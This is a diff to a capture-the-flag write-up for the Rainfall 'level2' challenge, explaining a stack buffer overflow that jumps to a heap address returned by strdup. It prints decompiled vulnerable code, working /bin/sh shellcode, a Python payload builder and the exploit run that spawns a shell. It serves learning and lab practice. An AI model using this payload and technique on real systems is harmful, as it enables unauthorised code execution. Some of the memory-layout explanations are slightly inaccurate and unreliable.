@@ -130,5 +130,78 @@ If we dump a little more of the stack, we get:
 ...
 ```
 Where we can see the return address (last piece of data).
-So, the return address is stored at **0xbffff6ec**, and the buffer starts at **0xbffff69c**. The buffer obviously grows towards higher addresses, thus we need to write **0xbffff6ec** - **0xbffff69c** = **0x50** = 80 characters to overwrite the return address.
+So, the return address is stored at **0xbffff6ec**, and the buffer starts at **0xbffff69c**. The buffer obviously grows towards higher addresses, thus we need to write **0xbffff6ec** - **0xbffff69c** = **0x50** = 80 characters before overwriting the return address.
 
+By passing the binary to Hex-Rays, we get an approximative code of `p`:
+```c
+char *p()
+{
+  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
+  const void *v2; // [esp+5Ch] [ebp-Ch]
+  unsigned int retaddr; // [esp+6Ch] [ebp+4h]
+
+  fflush(stdout);
+  gets(s);
+  v2 = (const void *)retaddr;
+  if ( (retaddr & 0xB0000000) == -1342177280 ) // 0xB0000000 = -1342177280 (signed) 
+  {
+    printf("(%p)\n", v2);
+    _exit(1);
+  }
+  puts(s);
+  return strdup(s);
+}
+```
+
+The `if` line is interesting. `(retaddr & 0xB0000000)` will only take the first 4 bytes of `retaddr`, and compare them to `-1342177280`, which is `0xB0000000`. 
+
+For context, in older Linux distributions, that used to run on 32-bit, some memory spaces had known ranges. Typically, the User Space's range was from `0x00000000` from `0xBFFFFFFF` (3GB of the 4GB of the 32bit system), when the Kernel Space's range was from `0xC0000000` to `0xFFFFFFFF` (1GB of the 4GB). When some data from the User Space leaked on the Kernel Space, it was blocked and resulted into a segmentation fault.   
+
+Thus, the `if` line is checking whether or not the return address is located in the User Space, which could mean that it has been tampered. It is a very primitive way of protecting against certain buffer overflows (modern sytems use the NX Flag (non-executable stack) and ASLR (Address Space Layour Randomisation)).
+
+The user space stacks usually started at around `0xC0000000` (at the top of the space) and grew downwards. Thus, they are in the `0xB...` space and making a stack overflow would be interrupted by the `if` line, or it might take an enormous overflow and taking care of many considerations. 
+
+A simpler solution is to make a Heap overflow, as the Heap tends to have lower memory addresses.
+Moreover, we see in the code that `p` calls `strdup`, which calls `malloc`, a function used to allocate memory... on the heap!
+
+By running the `level2` binary with `ltrace` multiple times, we see that it always points out to the same return address, `0x0804a008`, which is **NOT** in the `0xB...` range. Good!
+
+```
+level1@Rainfall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7b4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                            = 0
+gets(0xbffff6bc, 0, 0, 0xb7e5ec73, 0x80482b5test
+)                                 = 0xbffff6bc
+puts("test"test
+)                                                                  = 5
+strdup("test")                                                                = 0x0804a008
++++ exited (status 8) +++
+```
+
+The idea now is to craft a payload that will give us a shell and overwrite the return address by the return address outside of the `0xB...` space, the one of `strdup`!
+
+A shellcode database can be found [here](https://shell-storm.org/shellcode/index.html), we are going to use this [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html) from kernel_panik. 
+
+We now have a shellcode, a buffer length, and a return address, let's make our payload:
+```py
+len_buffer = 80
+shell_code = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+return_address = b"\x08\xa0\x04\x08"
+
+payload = (
+    shell_code +
+    b"A" * (len_buffer - len(shell_code)) +
+    return_address
+)
+
+print(payload)
+```
+Give yourself all the permissions on the home of level2, `scp` the script onto the machine, redirect its output to a file exploit the binary:
+```bash
+cat attack.txt - | ./level2
+1���Qh//shh/bin��
+                  ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+whoami
+level3
+```
+Grab the password, and level2 completed!
